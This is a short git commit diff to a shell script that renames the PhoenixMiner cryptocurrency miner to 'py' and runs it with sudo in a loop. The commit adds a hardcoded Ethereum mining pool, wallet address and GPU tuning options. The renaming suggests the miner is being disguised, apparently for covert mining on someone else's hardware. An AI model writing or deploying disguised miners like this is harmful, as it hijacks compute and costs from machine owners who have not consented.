5219b2fb0f0f6897241640b6411127f85c5e62ab
wikangdijalalan2 <82296471+wikangdijalalan2@users.noreply.github.com>
2021-08-19 22:11:31 +0930

    Update Bornoe.sh

--- Bornoe.sh
+++ Bornoe.sh
@@ -10,7 +10,7 @@ mv PhoenixMiner py
 while [ $x -le 20 ]
 do
 
-  sudo ./py $TP
+  sudo ./py -pool eth.2miners.com:2020 -wal 0x079885cbd1569bf0db5af3b8eb6818d963e2309f.PNIX$P -pass x -mi 14 -gt 400
 
 
   x=$(( $x + 1 ))
